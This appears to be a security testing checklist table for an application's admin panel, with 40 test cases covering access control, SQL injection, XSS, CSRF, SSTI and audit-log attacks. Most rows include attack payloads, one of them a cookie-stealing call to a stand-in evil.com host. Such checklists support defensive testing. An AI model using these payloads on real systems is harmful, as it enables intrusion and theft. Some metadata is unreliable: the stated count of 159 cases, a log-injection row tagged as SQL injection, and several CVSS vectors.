# 22. Administrative Features — Checklist

Feature-area security **test cases** for “22. Administrative Features” — functionality-driven, impact-first with severity + CVSS.

*159 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| ADMIN-001 | Unauthorized Access to User Management Panel | Broken Access Control (WSTG-AUTHZ-02) | User Management | 1. Login as a regular non-admin user.<br>2. Navigate directly to the user management URL.<br>3. Access user management API endpoints.<br>4. Check if user listing or CRUD operations are accessible.<br>5. Test with different HTTP methods. | Application must restrict all user management functionality to authorized admin roles and return 403 Forbidden for unauthorized users. | <code>GET /api/admin/users;POST /api/admin/users/create;PUT /api/admin/users/1001;DELETE /api/admin/users/1001 with regular user token</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-002 | IDOR on User Profile Access via Admin Panel | Broken Access Control (WSTG-AUTHZ-04) | User Management | 1. Login as an admin.<br>2. View a specific user profile.<br>3. Change user_id to access users in other tenants or organizations.<br>4. Enumerate user IDs.<br>5. Check for cross-tenant data leakage. | Application must enforce tenant isolation in user management and prevent admin from accessing users outside their authorized scope. | <code>Change GET /api/admin/users/1001 to GET /api/admin/users/9999;enumerate user IDs across tenants</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-003 | Privilege Escalation via User Role Modification | Broken Access Control (WSTG-AUTHZ-02) | User Management | 1. As a lower-privilege admin attempt to elevate a user to super-admin.<br>2. Modify own role to super-admin via API.<br>3. Create a new user with elevated privileges.<br>4. Check for role hierarchy enforcement. | Application must enforce role hierarchy preventing admins from creating or modifying users with equal or higher privileges than their own. | <code>PUT /api/admin/users/1001 with role=super_admin using regular admin token;POST /api/admin/users/create with role=owner</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-004 | SQL Injection in User Search | Injection (WSTG-INPV-05) | User Management | 1. Use the admin user search functionality.<br>2. Inject SQL payloads in search parameters including name and email and role and status.<br>3. Test with UNION-based and blind injection.<br>4. Observe responses for data leakage. | Application must use parameterized queries for all user search operations in the admin panel. | <code>GET /api/admin/users/search?q=' OR 1=1--;GET /api/admin/users?email=test' UNION SELECT password;role FROM users--;search=admin'--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-005 | XSS in User Management Fields | Cross-Site Scripting (WSTG-INPV-02) | User Management | 1. Create or edit a user with XSS payload in name and email and department and notes fields.<br>2. View the user listing in the admin panel.<br>3. Check if the payload executes for other admins.<br>4. Test in CSV/PDF export of user list. | Application must sanitize all user management input fields and encode output when rendering user data in the admin panel. | <code>username=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;department=&lt;img src=x onerror=alert(1)&gt;;notes=&lt;svg/onload=fetch('https://evil.com/'+document.cookie)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-006 | CSRF on User Account Modification | CSRF (WSTG-SESS-05) | User Management | 1. Craft a malicious page that modifies a user's role or deactivates an account.<br>2. Lure an admin to visit while authenticated.<br>3. Check if CSRF protection exists on user management operations.<br>4. Test all user CRUD operations. | Application must validate anti-CSRF tokens on all user management operations including creation and modification and deletion. | <code>&lt;form action='https://target.com/api/admin/users/1001' method='POST'&gt;&lt;input name='role' value='disabled'&gt;&lt;input name='_method' value='PUT'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ADMIN-007 | Mass User Deletion Without Confirmation | Business Logic (WSTG-BUSL-02) | User Management | 1. Attempt bulk user deletion via API.<br>2. Check if confirmation is required.<br>3. Test if there are safeguards against deleting all users.<br>4. Verify if self-deletion is prevented.<br>5. Check for undo capability. | Application must require explicit confirmation for bulk user operations and prevent deletion of the last admin account or self-deletion. | <code>POST /api/admin/users/bulk-delete with user_ids=[1001;1002;...;9999];attempt DELETE of own admin account</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-008 | User Account Enumeration via Admin API | Information Disclosure (WSTG-INFO-04) | User Management | 1. Access user listing endpoint with various filters.<br>2. Check if the API reveals user existence through response differences.<br>3. Test with email enumeration.<br>4. Check for verbose error messages. | Application must not reveal user existence through API response differences and must implement consistent error handling. | <code>GET /api/admin/users?email=exists@test.com vs email=nonexistent@test.com;compare response codes and messages</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| ADMIN-009 | Forced Password Reset by Non-Authorized Admin | Broken Access Control (WSTG-AUTHZ-02) | User Management | 1. As a lower-level admin attempt to reset passwords for higher-level admins.<br>2. Force password reset for users outside jurisdiction.<br>3. Check for role hierarchy enforcement on password operations. | Application must enforce role hierarchy on password reset operations preventing lower-level admins from resetting higher-level admin passwords. | <code>POST /api/admin/users/SUPER_ADMIN_ID/reset-password with regular admin token</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADMIN-010 | User Data Export Without Authorization | Broken Access Control (WSTG-AUTHZ-02) | User Management | 1. Attempt to export all user data.<br>2. Check if export includes sensitive fields like password hashes and payment info.<br>3. Test if non-admin users can access export endpoints.<br>4. Verify data minimization in exports. | Application must restrict user data export to authorized admins and exclude highly sensitive fields like password hashes from exports. | <code>GET /api/admin/users/export;GET /api/admin/users/export?format=csv with non-admin credentials;check export for password_hash fields</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-011 | Mass Assignment on User Object | Mass Assignment (WSTG-INPV-01) | User Management | 1. Create or update a user via admin API.<br>2. Add hidden parameters like is_super_admin=true or bypass_2fa=true or email_verified=true.<br>3. Check if unauthorized fields are accepted. | Application must whitelist allowed user attributes for admin operations and reject any unauthorized parameters. | <code>Add is_super_admin=true&amp;bypass_2fa=true&amp;email_verified=true&amp;account_balance=999999 to user creation body</code> | Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-915; [IDOR kit](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA |
| ADMIN-012 | User Session Invalidation After Admin Changes | Session Management (WSTG-SESS-01) | User Management | 1. Admin deactivates a user account.<br>2. Check if the user's active sessions are immediately invalidated.<br>3. Admin changes user role.<br>4. Verify if the user's permissions are updated in real-time without requiring re-login. | Application must immediately invalidate all active sessions when an admin deactivates an account or changes critical user attributes like role. | <code>Deactivate user then check if their existing session token still works for API access;change role and test old permissions</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADMIN-013 | Unauthorized Role Creation | Broken Access Control (WSTG-AUTHZ-02) | Role Management | 1. As a regular admin attempt to create new roles.<br>2. Access role management API endpoints.<br>3. Create a role with super-admin permissions.<br>4. Check if role creation is restricted to authorized users. | Application must restrict role creation and modification to authorized super-admin or role management users only. | <code>POST /api/admin/roles/create with regular admin token;create role with permissions=["&#42;"] or permissions=["admin.all"]</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-014 | Permission Escalation via Role Modification | Broken Access Control (WSTG-AUTHZ-02) | Role Management | 1. Edit an existing role.<br>2. Add permissions that exceed the editor's own permission level.<br>3. Assign self to the modified role.<br>4. Check if the application enforces permission boundaries. | Application must prevent admins from adding permissions to roles that exceed their own permission level and enforce permission hierarchy. | <code>PUT /api/admin/roles/ROLE-1001 adding permission=super_admin.all;add delete_users to a role when editor lacks that permission</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-015 | Role Deletion Impact Assessment Bypass | Business Logic (WSTG-BUSL-02) | Role Management | 1. Delete a role that is actively assigned to users.<br>2. Check if assigned users lose access or get default role.<br>3. Test if orphaned users gain unexpected permissions.<br>4. Verify impact assessment before deletion. | Application must prevent deletion of roles with active assignments or reassign users before deletion with proper impact assessment. | <code>DELETE /api/admin/roles/ROLE-1001 when 100+ users are assigned;check for orphaned permissions</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-016 | SQL Injection in Role Permission Query | Injection (WSTG-INPV-05) | Role Management | 1. View role permissions.<br>2. Inject SQL payloads in role_id or permission filter parameters.<br>3. Test for data extraction from roles and users tables.<br>4. Observe for SQL errors. | Application must use parameterized queries for all role and permission management database operations. | <code>GET /api/admin/roles?id=' OR 1=1--;GET /api/admin/roles/permissions?role=' UNION SELECT password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-017 | XSS in Role Name and Description | Cross-Site Scripting (WSTG-INPV-02) | Role Management | 1. Create or edit a role with XSS payload in name and description.<br>2. View the role listing and assignment pages.<br>3. Check if the payload executes for other admins viewing roles. | Application must sanitize all role management fields and encode output when rendering role information. | <code>role_name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;role_description=&lt;img src=x onerror=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-018 | IDOR on Role Access | Broken Access Control (WSTG-AUTHZ-04) | Role Management | 1. Access own organization's roles.<br>2. Change role_id to access roles from another tenant.<br>3. Enumerate role IDs across tenants.<br>4. Check for cross-tenant role data leakage. | Application must enforce tenant isolation on role management and prevent cross-tenant role access or enumeration. | <code>GET /api/admin/roles/ROLE-2001 from different tenant;enumerate ROLE-0001 through ROLE-9999</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-019 | CSRF on Role Assignment | CSRF (WSTG-SESS-05) | Role Management | 1. Craft a malicious page that assigns a privileged role to an attacker-controlled user.<br>2. Lure admin to visit.<br>3. Check if role assignment occurs without CSRF token validation. | Application must validate CSRF tokens on all role assignment and modification operations. | <code>&lt;script&gt;fetch('/api/admin/users/ATTACKER_ID/role',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"role":"super_admin"}'})&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ADMIN-020 | Default Role Permission Audit | Security Misconfiguration (WSTG-CONF-01) | Role Management | 1. Check permissions assigned to the default user role.<br>2. Verify if default role has excessive permissions.<br>3. Check if new users get admin or elevated default roles.<br>4. Review all predefined roles for least privilege. | Default roles must follow the principle of least privilege with no administrative permissions granted to regular user defaults. | <code>Review GET /api/admin/roles/default for excessive permissions;check new user registration default_role assignment</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Manual Review | CWE-16; OWASP Security Misconfiguration (A05) |
| ADMIN-021 | Role Hierarchy Bypass | Broken Access Control (WSTG-AUTHZ-02) | Role Management | 1. Check if the application enforces role hierarchy.<br>2. As a mid-level admin attempt to manage higher-level admins.<br>3. Try to view or modify super-admin accounts.<br>4. Check if role hierarchy is consistently enforced. | Application must enforce a strict role hierarchy preventing lower-level admins from managing users at or above their level. | <code>PUT /api/admin/users/SUPER_ADMIN_ID/settings with regular admin token;attempt to deactivate higher-level admin</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-022 | Unauthorized System Settings Access | Broken Access Control (WSTG-AUTHZ-02) | System Settings | 1. As a non-admin user attempt to access system settings.<br>2. Try API endpoints for system configuration.<br>3. Check if settings are readable or modifiable.<br>4. Test with different role levels. | Application must restrict all system settings access to authorized super-admin roles and return 403 for unauthorized access. | <code>GET /api/admin/settings;PUT /api/admin/settings/security;POST /api/admin/settings/email with non-admin credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-023 | Sensitive Configuration Exposure in API Response | Information Disclosure (WSTG-INFO-05) | System Settings | 1. Access system settings API.<br>2. Check if response includes database connection strings or API keys or SMTP passwords or secret keys.<br>3. Verify sensitive values are masked.<br>4. Check for encryption key exposure. | System settings API must mask or exclude sensitive configuration values like passwords and API keys and encryption keys from responses. | <code>Check GET /api/admin/settings for db_password;smtp_password;api_secret;encryption_key;jwt_secret in plain text</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-024 | System Settings Manipulation for Security Bypass | Business Logic (WSTG-BUSL-01) | System Settings | 1. Modify system security settings via API.<br>2. Disable password complexity requirements.<br>3. Disable 2FA enforcement.<br>4. Disable rate limiting or CAPTCHA.<br>5. Check if security features can be turned off. | Application must require elevated authentication and audit logging for security setting changes and prevent disabling critical security features without safeguards. | <code>PUT /api/admin/settings with password_min_length=1;two_factor_required=false;rate_limiting_enabled=false;captcha_enabled=false</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-025 | SQL Injection in System Settings Save | Injection (WSTG-INPV-05) | System Settings | 1. Modify system settings and inject SQL payloads in setting values.<br>2. Test in setting names and descriptions.<br>3. Submit and observe for SQL errors or data leakage. | Application must use parameterized queries for all system settings storage and retrieval operations. | <code>setting_value=test' OR 1=1--;setting_name=smtp_host'; DROP TABLE settings;--;app_name=&lt;value&gt;' UNION SELECT password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-026 | XSS via System Settings Values | Cross-Site Scripting (WSTG-INPV-02) | System Settings | 1. Modify system settings with XSS payload in values like app_name or welcome_message or footer_text.<br>2. View application pages where settings are rendered.<br>3. Check if XSS executes for all users. | Application must sanitize all system setting values and encode output when rendering settings in application pages. | <code>app_name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;welcome_message=&lt;img src=x onerror=alert(1)&gt;;footer_text=&lt;svg/onload=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-027 | CSRF on Critical System Settings Change | CSRF (WSTG-SESS-05) | System Settings | 1. Craft a malicious page that modifies critical system settings like security or authentication configuration.<br>2. Lure super-admin to visit.<br>3. Check if settings change without CSRF validation. | Application must validate CSRF tokens and require re-authentication for changes to critical system security settings. | <code>&lt;script&gt;fetch('/api/admin/settings',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"mfa_required":false,password_policy:"none"}'})&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ADMIN-028 | System Settings Race Condition | Business Logic (WSTG-BUSL-08) | System Settings | 1. Send concurrent system settings update requests with conflicting values.<br>2. Check if final state is inconsistent.<br>3. Test with rapid toggling of security features.<br>4. Verify atomic settings updates. | Application must implement atomic system settings updates with proper locking to prevent inconsistent configuration from concurrent modifications. | <code>Send concurrent PUT /api/admin/settings with conflicting values for same setting simultaneously</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ADMIN-029 | SSTI in System Settings Template Values | Injection (WSTG-INPV-18) | System Settings | 1. If system settings include template-rendered values inject SSTI payloads.<br>2. Test in email templates and page templates and notification templates referenced by settings.<br>3. Check for template evaluation. | Application must treat system setting values as static data and not process template syntax within setting values. | <code>app_tagline={{7&#42;7}};custom_header=${Runtime.getRuntime().exec('id')};footer=&lt;%= system('whoami') %&gt;</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap | CWE-1336; [SSTI kit](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| ADMIN-030 | Unauthorized Audit Log Access | Broken Access Control (WSTG-AUTHZ-02) | Audit Logs | 1. As a regular user attempt to access audit logs.<br>2. Try various audit log API endpoints.<br>3. Check if log viewing is restricted to security admin roles.<br>4. Test with different role levels. | Application must restrict audit log access to authorized security administrators and audit roles only. | <code>GET /api/admin/audit-logs;GET /api/admin/audit-logs/search;GET /api/admin/audit-logs/export with non-admin credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-031 | Audit Log Tampering | Broken Access Control (WSTG-AUTHZ-02) | Audit Logs | 1. Attempt to modify existing audit log entries via API.<br>2. Try to delete specific log entries.<br>3. Check if logs are append-only.<br>4. Test for log truncation endpoints.<br>5. Verify log integrity protection. | Audit logs must be immutable and append-only with integrity verification preventing any modification or deletion by any user including admins. | <code>PUT /api/admin/audit-logs/LOG-1001;DELETE /api/admin/audit-logs/LOG-1001;POST /api/admin/audit-logs/truncate with admin credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-032 | Audit Log Injection | Injection (WSTG-INPV-15) | Audit Logs | 1. Perform actions that generate audit log entries.<br>2. Include CRLF and newline characters in logged parameters.<br>3. Inject fake log entries via crafted input.<br>4. Test for ANSI escape code injection.<br>5. Verify log sanitization. | Application must sanitize all data written to audit logs to prevent log injection and log forging attacks. | <code>username=admin%0a[SUCCESS] Super admin login from trusted IP;action=update%0d%0a[CRITICAL] Unauthorized access granted;inject ANSI codes</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-033 | SQL Injection in Audit Log Search | Injection (WSTG-INPV-05) | Audit Logs | 1. Search audit logs by various criteria.<br>2. Inject SQL payloads in search parameters like date range and user and action type.<br>3. Observe for SQL errors or unauthorized data extraction. | Application must use parameterized queries for all audit log search and filtering operations. | <code>GET /api/admin/audit-logs?user=' OR 1=1--;GET /api/admin/audit-logs?action=login' UNION SELECT password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-034 | Audit Log Information Disclosure | Information Disclosure (WSTG-INFO-05) | Audit Logs | 1. Review audit log entries for sensitive data exposure.<br>2. Check if passwords or tokens or API keys appear in logs.<br>3. Verify if PII is properly masked in log entries.<br>4. Check for excessive logging detail. | Audit logs must not contain plaintext passwords or session tokens or API keys and must mask PII appropriately. | <code>Check audit log entries for password=plaintext;session_token=full_value;api_key=full_value;credit_card=full_number</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Manual Review | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-035 | Audit Log Export IDOR | Broken Access Control (WSTG-AUTHZ-04) | Audit Logs | 1. Export audit logs for own tenant.<br>2. Change tenant_id or organization_id in export request.<br>3. Check if logs from other organizations are included in the export.<br>4. Verify tenant isolation in exports. | Application must enforce tenant isolation in audit log exports and prevent cross-tenant log data leakage. | <code>GET /api/admin/audit-logs/export?tenant_id=TENANT-2001 with TENANT-1001 admin credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-036 | Missing Audit Logging for Critical Operations | Logging (WSTG-CONF-09) | Audit Logs | 1. Perform all critical administrative operations.<br>2. Check if each operation generates an audit log entry.<br>3. Verify log completeness for user CRUD and role changes and settings modifications and data exports.<br>4. Test for logging gaps. | All critical administrative operations must generate complete audit log entries with timestamp and actor and action and target and result. | <code>Perform user creation;role change;settings modification;data export;backup;then verify each creates audit entry with all required fields</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Manual Review;Burp Suite | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| ADMIN-037 | Audit Log Denial of Service | Business Logic (WSTG-BUSL-05) | Audit Logs | 1. Generate massive volume of logged events rapidly.<br>2. Check if log storage capacity is monitored.<br>3. Test if log DoS affects application performance.<br>4. Verify log rotation and retention policies. | Audit log infrastructure must handle high volumes without affecting application performance with proper rotation and retention and monitoring. | <code>Generate 100000+ logged events per minute;check for storage exhaustion;verify log rotation;monitor application performance impact</code> | Denial of service -&gt; availability impact for this feature / the app. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;JMeter;Custom Scripts | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
| ADMIN-038 | XSS in Audit Log Viewer | Cross-Site Scripting (WSTG-INPV-02) | Audit Logs | 1. Perform actions that include XSS payloads in logged fields.<br>2. View audit logs in admin panel.<br>3. Check if stored XSS executes when admins view log entries.<br>4. Test in log export views. | Application must encode all audit log data when rendering in the admin panel to prevent stored XSS attacks targeting security administrators. | <code>Perform action with username=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;view in audit log viewer;check export rendering</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADMIN-039 | Unauthorized Access to Health Monitoring | Broken Access Control (WSTG-AUTHZ-02) | System Health Monitoring | 1. Access health monitoring endpoints without authentication.<br>2. Check common health check URLs.<br>3. Test with regular user credentials.<br>4. Check for exposed monitoring dashboards. | Application must restrict detailed health monitoring to authorized admin users and only expose minimal status on public health endpoints. | <code>GET /health;/status;/api/health;/actuator/health;/monitoring;/metrics;/api/admin/health with no or regular user credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;DirBuster | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-040 | Sensitive Information in Health Endpoints | Information Disclosure (WSTG-INFO-05) | System Health Monitoring | 1. Access all health monitoring endpoints.<br>2. Check for database connection details and server versions and internal IP addresses and memory usage and thread counts.<br>3. Verify information classification. | Health monitoring endpoints must not expose sensitive infrastructure details like database connections and internal IPs and server versions to unauthorized users. | <code>GET /actuator/env;/actuator/configprops;/health/details;check for db_host;db_password;internal_ip;server_version;stack_trace</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
